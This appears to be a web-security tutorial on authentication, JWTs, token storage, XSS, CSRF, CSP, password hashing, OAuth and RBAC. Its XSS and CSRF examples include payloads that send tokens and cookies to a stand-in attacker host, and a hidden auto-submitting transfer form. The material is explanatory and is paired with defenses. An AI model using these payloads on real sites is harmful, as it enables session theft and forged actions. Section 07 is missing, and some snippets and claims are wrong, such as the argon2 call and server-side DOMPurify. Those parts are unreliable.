## 01. The Core Split: Authentication vs. Authorization

These two terms are constantly confused. They are different boundaries:

| Concern | Question It Answers | Example |
|---------|-------------------|---------|
| **Authentication** | "Who are you?" | Login form verifies email + password |
| **Authorization** | "What are you allowed to do?" | Admin panel checks if user has `admin` role |

**Authentication always comes first.** You can't check permissions until you know who's asking.

## 02. Stateless vs. Stateful Auth: The Architecture Decision

Your first architectural decision is how the server remembers the user's identity across requests.

### Stateful Sessions (Server-Side)

```
User logs in
    │
    ▼
Server generates random Session ID: "abc123"
    │
    ├──▶ Stores in Redis: { "abc123": { userId: 42, role: "admin" } }
    │
    └──▶ Sends to browser as cookie: Set-Cookie: session=abc123; HttpOnly; Secure

Every subsequent request:
    Browser sends cookie: Cookie: session=abc123
    Server looks up "abc123" in Redis → finds userId 42 → "Welcome, user 42"
```

**Pros:**
- Instant revocation — delete the session from Redis, user is logged out immediately
- Server controls session lifetime — no expiration hacks needed
- Simple to implement and debug

**Cons:**
- Requires a shared session store (Redis) across all server instances
- Horizontal scaling requires every server to reach the same Redis cluster
- Redis becomes a single point of failure for auth

### Stateless JWTs (Client-Side)

```
User logs in
    │
    ▼
Server creates JWT:

<div class="flow">
  <div class="flow-step">
    <div class="flow-box">
      <span class="flow-num">Header</span>
      <span class="flow-label">{"alg": "HS256"}</span>
      <span class="flow-sub">{"typ": "JWT"}</span>
    </div>
  </div>
  <div class="flow-step">
    <div class="flow-arrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="5" y1="12" x2="19" y2="12"/></svg></div>
  </div>
  <div class="flow-step">
    <div class="flow-box">
      <span class="flow-num">Payload</span>
      <span class="flow-label">{"sub": 42}</span>
      <span class="flow-sub">{"role": "admin"}</span>
    </div>
  </div>
  <div class="flow-step">
    <div class="flow-arrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="5" y1="12" x2="19" y2="12"/></svg></div>
  </div>
  <div class="flow-step">
    <div class="flow-box">
      <span class="flow-num">Signature</span>
      <span class="flow-label">HMAC-SHA256</span>
      <span class="flow-sub">header + payload + secret</span>
    </div>
  </div>
</div>

Server sends: `eyJhbGciOi...` (encoded string)
Browser stores: in HttpOnly cookie (NOT localStorage)

Every subsequent request: Browser sends `Authorization: Bearer eyJhbGciOi...` → Server decodes JWT, verifies signature, reads payload → "Welcome, user 42" (No database lookup needed).

**Pros:**
- No server-side storage — token is self-contained
- Horizontal scaling works instantly — every server has the same secret key
- Works across domains and microservices

**Cons:**
- Cannot easily revoke before expiration — stolen token = 2-hour access (or whatever the expiry is)
- Requires token refresh infrastructure to rotate tokens
- Payload is base64-encoded (not encrypted) — anyone can read it (but not forge it)

### The Decision Matrix

| Factor | Sessions | JWTs |
|--------|----------|------|
| **Revocation** | Instant (delete from Redis) | Difficult (need blacklist or short expiry) |
| **Scaling** | Requires shared Redis | Scales horizontally with zero coordination |
| **Complexity** | Lower to implement | Higher (refresh tokens, rotation, blacklisting) |
| **Microservices** | Harder (central session store) | Natural fit (each service verifies independently) |
| **Best For** | Traditional server-rendered apps | SPAs, mobile apps, microservices |

### Senior Move: The Hybrid Pattern

Use **short-lived JWTs (15 min)** paired with **long-lived refresh tokens (7 days)** stored in HttpOnly cookies. The JWT handles authorization on every request. When it expires, the refresh token silently rotates a new JWT without user interaction. If the refresh token is stolen, revoke it server-side and the attacker loses access.

```
Access Token (JWT):  15 min expiry  → Sent with every request
Refresh Token:       7 day expiry   → Stored in HttpOnly cookie, used only to get new JWTs
```

## 03. JWT Structure Deep Dive

A JWT is three base64url-encoded segments separated by dots:

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOjQyLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MjAwMDAwMDB9.signature
│                         │                         │
├─ Header                 ├─ Payload                ├─ Signature
│  {"alg":"HS256",        │  {"sub":42,             │  HMAC-SHA256(
│   "typ":"JWT"}          │   "role":"admin",        │    header + payload,
│                         │   "exp":1720000000}     │    secret_key)
│                         │                         │
│  Algorithm used         │  User data + expiry     │  Proves token wasn't tampered with
```

**Critical:** The payload is **encoded, not encrypted**. Anyone can decode it and read the data. Never put sensitive information (passwords, SSN, credit card numbers) in a JWT payload. Only put what's needed for authorization (user ID, role, permissions).

### JWT Verification Flow

```typescript
import jwt from 'jsonwebtoken';

// Server-side verification
function verifyToken(token: string) {
  try {
    // This decodes the payload AND verifies the signature
    // If the signature doesn't match (token was tampered with), it throws
    const payload = jwt.verify(token, process.env.JWT_SECRET);
    return { valid: true, user: payload };
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return { valid: false, error: 'Token expired' };
    }
    return { valid: false, error: 'Invalid token' };
  }
}
```

## 04. Token Storage: The Security Battlefield

Where you store tokens determines your entire security posture. This is where most AI-generated code gets it wrong.

### The Storage Comparison

| Storage | XSS Safe? | CSRF Safe? | Accessibility | Verdict |
|---------|-----------|------------|---------------|---------|
| `localStorage` | **No** — JS can read it | Yes — not sent with requests | Easy | **Never for auth tokens** |
| `sessionStorage` | **No** — JS can read it | Yes — not sent with requests | Easy | **Never for auth tokens** |
| `HttpOnly Cookie` | **Yes** — JS cannot touch it | **No** — sent with every request | Limited | **Best for access tokens** |
| `Memory (JS variable)` | **No** — cleared on refresh | Yes | Terrible | **Never** |

### The Correct Pattern: HttpOnly + Secure + SameSite

```typescript
// Setting the authentication cookie
res.cookie('access_token', jwt, {
  httpOnly: true,      // JavaScript CANNOT read this cookie
  secure: true,        // Only sent over HTTPS
  sameSite: 'lax',    // Not sent on cross-origin requests (CSRF protection)
  maxAge: 15 * 60 * 1000,  // 15 minutes
  path: '/',           // Available on all routes
});

// Setting the refresh token cookie (longer lived)
res.cookie('refresh_token', refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',  // Even stricter — never sent on any cross-origin
  maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
  path: '/auth/refresh',  // Only sent to the refresh endpoint
});
```

### Why HttpOnly Blocks XSS

```javascript
// An attacker injects this script via an unsanitized input field:
<script>
  // This CANNOT access HttpOnly cookies — returns undefined
  document.cookie  // "theme=dark" (non-sensitive cookies only)

  // This CAN read localStorage — YOUR TOKEN IS STOLEN
  fetch('https://hacker.com/steal?token=' + localStorage.getItem('token'))
</script>
```

The `HttpOnly` flag tells the browser: "This cookie exists for HTTP requests only. Never expose it to JavaScript." Even if an XSS attack executes arbitrary code in the browser, the auth token is invisible.

## 05. XSS, CSRF & CSP: The Three Walls

### XSS (Cross-Site Scripting)

**What it is:** An attacker injects malicious JavaScript into your page that runs in other users' browsers.

**How it happens:** Unsanitized user input rendered into HTML:

```typescript
// VULNERABLE — user input rendered directly into HTML
app.get('/search', (req, res) => {
  res.send(`<h1>Results for: ${req.query.q}</h1>`);
  // If q = <script>fetch('https://hacker.com?cookie='+document.cookie)</script>
  // The script executes in every user's browser
});

// SAFE — user input is escaped before rendering
import DOMPurify from 'dompurify';
app.get('/search', (req, res) => {
  const clean = DOMPurify.sanitize(req.query.q);
  res.send(`<h1>Results for: ${clean}</h1>`);
});
```

### CSRF (Cross-Site Request Forgery)

**What it is:** A malicious site tricks a user's browser into making requests to your API, automatically attaching their cookies.

**How it happens:**

```html
<!-- Malicious site: evil-hacker.com -->
<img src="https://api.yourapp.com/account/delete" />
<!-- Browser sends cookie automatically — action executes -->

<form action="https://api.yourapp.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
<!-- Browser sends cookie automatically — transfer executes -->
```

### The Defense: SameSite Cookies + CSRF Tokens

```typescript
// Defense 1: SameSite cookie attribute
res.cookie('session', sessionId, {
  sameSite: 'lax',     // Cookie NOT sent on cross-origin POST requests
  // 'strict' = never sent cross-origin (even for GET navigations)
  // 'lax' = sent only on top-level GET navigations (safe default)
  // 'none' = sent always (requires Secure flag — use sparingly)
});

// Defense 2: Anti-CSRF token
// Server generates a random token per session
const csrfToken = crypto.randomBytes(32).toString('hex');

// Embeds it in the HTML form
res.send(`
  <form action="/transfer" method="POST">
    <input type="hidden" name="_csrf" value="${csrfToken}" />
    ...
  </form>
`);

// Server validates the token on every mutation request
app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).json({ error: 'CSRF token invalid' });
  }
  // Process the transfer...
});
```

### CSP (Content Security Policy)

CSP is an HTTP header that tells the browser which sources of scripts, styles, and resources are trusted. Even if an attacker injects a `<script>` tag, the browser blocks it if the source isn't in your policy.

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.yourapp.com;
  font-src 'self' https://fonts.gstatic.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

**What this blocks:**
- Inline `<script>` tags (XSS injection)
- Scripts loaded from untrusted domains
- iframes embedding your site (clickjacking)
- Forms submitting to external sites

### The Complete Security Headers

```typescript
// Express.js — Set all security headers
import helmet from 'helmet';

app.use(helmet());

// Or manually:
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'");
  res.setHeader('X-Content-Type-Options', 'nosniff');      // Prevent MIME sniffing
  res.setHeader('X-Frame-Options', 'DENY');                 // Prevent clickjacking
  res.setHeader('X-XSS-Protection', '0');                   // Disable browser XSS filter (CSP replaces it)
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  next();
});
```

## 06. Password Hashing: Never Store Plaintext

**The rule:** Never store passwords in plaintext. Never MD5 them. Never SHA-256 them. Use a purpose-built password hashing algorithm with a salt.

### Why Not MD5/SHA-256?

MD5 and SHA-256 are designed to be *fast*. That's great for checksums, terrible for passwords. An attacker with a GPU can brute-force 100 billion MD5 hashes per second. A bcrypt hash takes 100ms to verify — making brute-force 10 million times slower.

### bcrypt in Practice

```typescript
import bcrypt from 'bcrypt';

const SALT_ROUNDS = 12;  // Cost factor — higher = slower = more secure

// Hashing during registration
async function hashPassword(plaintext: string): Promise<string> {
  return await bcrypt.hash(plaintext, SALT_ROUNDS);
  // Result: "$2b$12$LJ3m4ys3Lg2nPzDQzUzKxOeX5vYhS1kR8fT9gH2jK4lM6nO8pQ0i"
  // The "$2b$12$" prefix encodes the algorithm and cost factor
}

// Verification during login
async function verifyPassword(plaintext: string, hash: string): Promise<boolean> {
  return await bcrypt.compare(plaintext, hash);
  // Returns true if the plaintext matches the hash
  // The salt is embedded in the hash — no separate salt storage needed
}
```

### The Registration Flow

```typescript
app.post('/auth/register', async (req, res) => {
  const { email, password } = req.body;

  // Validate password strength BEFORE hashing
  if (password.length < 8) {
    return res.status(400).json({ error: 'Password must be at least 8 characters' });
  }

  // Check if user already exists
  const existing = await db.query('SELECT id FROM users WHERE email = $1', [email]);
  if (existing.rows.length > 0) {
    return res.status(409).json({ error: 'Email already registered' });
  }

  // Hash and store
  const hash = await hashPassword(password);
  await db.query(
    'INSERT INTO users (email, password_hash) VALUES ($1, $2)',
    [email, hash]
  );

  res.status(201).json({ message: 'Account created' });
});
```

### Argon2: The Modern Alternative

Argon2 won the Password Hashing Competition (2015) and is designed to be resistant to GPU and ASIC attacks. It's available in most languages and is the preferred choice for new projects.

```typescript
import { argon2id, hash, verify } from 'argon2';

const hash = await argon2id(password, {
  memoryCost: 65536,   // 64 MB memory usage
  timeCost: 3,         // 3 iterations
  parallelism: 4,      // 4 threads
});
```

### Senior Moves for Passwords

1. **Never reveal which field is wrong.** If login fails, say "Invalid email or password" — not "Email not found" or "Wrong password." This prevents enumeration attacks.
2. **Enforce password strength at registration.** Minimum 8 characters, check against common password lists (haveibeenpwned API).
3. **Implement account lockout.** After 5 failed login attempts, lock the account for 15 minutes or require CAPTCHA.
4. **Use bcrypt cost factor 12+.** Lower is faster to hash but easier to brute-force. 12 is the modern standard.

### Implementation with Passport.js

```typescript
import passport from 'passport';
import { Strategy as GoogleStrategy } from 'passport-google-oauth20';

passport.use(new GoogleStrategy({
    clientID: process.env.GOOGLE_CLIENT_ID,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET,
    callbackURL: '/auth/google/callback',
  },
  async (accessToken, refreshToken, profile, done) => {
    // Step 7: Find or create user in your database
    let user = await db.query('SELECT * FROM users WHERE google_id = $1', [profile.id]);

    if (user.rows.length === 0) {
      // First time — create account
      user = await db.query(
        'INSERT INTO users (google_id, email, name) VALUES ($1, $2, $3) RETURNING *',
        [profile.id, profile.emails[0].value, profile.displayName]
      );
    }

    done(null, user.rows[0]);
  }
));

// Routes
app.get('/auth/google', passport.authenticate('google', { scope: ['profile', 'email'] }));

app.get('/auth/google/callback',
  passport.authenticate('google', { failureRedirect: '/login' }),
  (req, res) => {
    // Step 8: User is authenticated, set your own session
    res.redirect('/dashboard');
  }
);
```

### Token Refresh Pattern

```typescript
// Silent token refresh — no user interaction required
async function refreshAccessToken(refreshToken: string) {
  const response = await fetch('https://oauth2.googleapis.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      client_id: process.env.GOOGLE_CLIENT_ID,
      client_secret: process.env.GOOGLE_CLIENT_SECRET,
      refresh_token: refreshToken,
      grant_type: 'refresh_token',
    }),
  });

  return await response.json();
  // Returns new access_token (and possibly new refresh_token)
}
```

### Senior Moves for OAuth

1. **Always validate the `state` parameter.** OAuth supports a `state` parameter to prevent CSRF during the handshake. Generate a random state, store it in the session, and verify it on callback.
2. **Never store the provider's access token.** You only need the user's profile ID and email. The access token is for the provider's API, not yours.
3. **Handle account linking.** If a user signs up with email first, then later connects Google, link the Google ID to the existing account — don't create a duplicate.
4. **Implement token refresh.** Access tokens expire (usually 1 hour). Use refresh tokens to get new ones silently. Store refresh tokens in your database, not just in cookies.

## 08. Role-Based Access Control (RBAC)

Authentication tells you *who* the user is. Authorization tells you *what they can do*. RBAC is the standard pattern for implementing authorization.

### The Schema

```sql
-- Users table
CREATE TABLE users (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  email TEXT UNIQUE NOT NULL,
  password_hash TEXT,
  created_at TIMESTAMPTZ DEFAULT now()
);

-- Roles table
CREATE TABLE roles (
  id SERIAL PRIMARY KEY,
  name TEXT UNIQUE NOT NULL  -- 'admin', 'editor', 'viewer'
);

-- Permissions table
CREATE TABLE permissions (
  id SERIAL PRIMARY KEY,
  name TEXT UNIQUE NOT NULL  -- 'posts:create', 'posts:delete', 'users:manage'
);

-- Many-to-many: role ↔ permission
CREATE TABLE role_permissions (
  role_id INT REFERENCES roles(id),
  permission_id INT REFERENCES permissions(id),
  PRIMARY KEY (role_id, permission_id)
);

-- Many-to-many: user ↔ role
CREATE TABLE user_roles (
  user_id UUID REFERENCES users(id),
  role_id INT REFERENCES roles(id),
  PRIMARY KEY (user_id, role_id)
);
```

### The Middleware

```typescript
// Middleware: Check if user has required permission
function requirePermission(permission: string) {
  return async (req, res, next) => {
    const user = req.user; // From auth middleware

    const hasPermission = await db.query(`
      SELECT 1 FROM user_roles ur
      JOIN role_permissions rp ON ur.role_id = rp.role_id
      JOIN permissions p ON rp.permission_id = p.id
      WHERE ur.user_id = $1 AND p.name = $2
    `, [user.id, permission]);

    if (hasPermission.rows.length === 0) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }

    next();
  };
}

// Usage in routes
app.delete('/api/posts/:id',
  requireAuth,                          // Must be logged in
  requirePermission('posts:delete'),    // Must have delete permission
  async (req, res) => {
    await db.query('DELETE FROM posts WHERE id = $1', [req.params.id]);
    res.status(204).end();
  }
);
```

### The Hierarchy Pattern

```typescript
// Define role hierarchy — higher roles inherit lower permissions
const ROLE_HIERARCHY = {
  viewer:  ['posts:read'],
  editor:  ['posts:read', 'posts:create', 'posts:update'],
  admin:   ['posts:read', 'posts:create', 'posts:update', 'posts:delete', 'users:manage'],
};

function userHasRole(userRole: string, requiredRole: string): boolean {
  const hierarchy = ['viewer', 'editor', 'admin'];
  return hierarchy.indexOf(userRole) >= hierarchy.indexOf(requiredRole);
}
```

## Key Takeaways

| Concept | Mental Model | Senior Insight |
|---------|-------------|----------------|
| Authentication vs Authorization | Who are you? vs What can you do? | Always auth first, then check permissions |
| Sessions vs JWTs | Server remembers vs Client carries | Use hybrid: short JWT + long refresh token in HttpOnly cookie |
| JWT Structure | Header + Payload + Signature | Payload is encoded not encrypted — never put secrets in it |
| HttpOnly Cookies | JavaScript cannot read them | The only safe place for auth tokens — blocks XSS theft |
| XSS | Injected scripts read your data | Sanitize all user input, use CSP headers |
| CSRF | Malicious site uses your cookies | SameSite cookies + anti-CSRF tokens |
| CSP | Browser's script allowlist | Blocks inline scripts and untrusted domains |
| Password Hashing | bcrypt with cost factor 12+ | Never MD5/SHA-256 — they're too fast for brute-force |
| OAuth 2.0 | Provider authenticates, you get a token | Always validate state parameter, never store provider access tokens |
| RBAC | Users → Roles → Permissions | Middleware checks permissions, not just authentication |
